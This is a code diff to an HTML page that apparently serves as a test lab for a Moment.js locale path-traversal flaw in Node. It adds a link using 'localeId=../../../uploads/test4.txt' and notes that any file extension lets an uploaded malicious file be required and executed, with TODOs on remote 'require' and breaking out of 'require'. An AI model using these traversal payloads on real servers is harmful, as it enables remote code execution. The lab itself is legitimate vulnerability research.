@@ -44,11 +44,13 @@
         <li class="list-group-item"><a id="getLink2" href="#"></a></li>
         <li class="list-group-item"><a id="getLink3" href="#"></a></li>
         <li class="list-group-item"><a id="getLink4" href="#"></a></li>
+        <li class="list-group-item"><a id="getLink5" href="#"></a></li>
       </ul>
 
       <h4 class="card-title">A few observations:</h4>
       <ul class="list-group list-group-flush">
         <li class="list-group-item">There is not a need to include the uploaded file's '.js' extension, but it is added to the examples for clarity.</li>
+        <li class="list-group-item">Any file extension can be used. For example /uploads/test.txt can be called with 'localeId=../../../uploads/test4.txt'. This significantly increases the likelihood of posting a malicious js file to the server for Node to 'require'. The only way to increase impact from here would be to directly append or breakout of the require statement and bypass the need for LFI all together.</li>
         <li class="list-group-item">Once a JavaScript file has been required by the loadLocale function, Node will not require (nor execute) that SAME file again until the server is restarted. Thus, you should restart the server or use multiple files for testing.</li>
         <li class="list-group-item">Reassignment of 'require' or 'import' may indicate a directory-based source is utilized, since this is a common reason for reassigning.</li>
         <li class="list-group-item">..</li>
@@ -56,8 +58,6 @@
 
       <h4 class="card-title">TODO</h4>
       <ul class="list-group list-group-flush">
-        <li class="list-group-item">Add an example that validates out-of-band.</li>
-        <li class="list-group-item">Add an example that provides greater impact.</li>
         <li class="list-group-item">ID if possible to do a remote 'require' both with and without a new module. Need be, try having node pull down file and then 'require' it.</li>
         <li class="list-group-item">ID if possible to breakout or append to the 'require'.</li>
         <li class="list-group-item">Enable switching of Moment.js versions.</li>
@@ -91,6 +91,8 @@
             document.getElementById('getLink3').innerText = `http://${serverIP}:${port}/moment?localeId=../../../uploads/test2.js`;
             document.getElementById('getLink4').href = `http://${serverIP}:${port}/moment?localeId=../../../uploads/test3.js`;
             document.getElementById('getLink4').innerText = `http://${serverIP}:${port}/moment?localeId=../../../uploads/test3.js`;
+            document.getElementById('getLink5').href = `http://${serverIP}:${port}/moment?localeId=../../../uploads/test4.txt`;
+            document.getElementById('getLink5').innerText = `http://${serverIP}:${port}/moment?localeId=../../../uploads/test4.txt`;
           })
           .catch(error => console.error('Error:', error));
 </script>
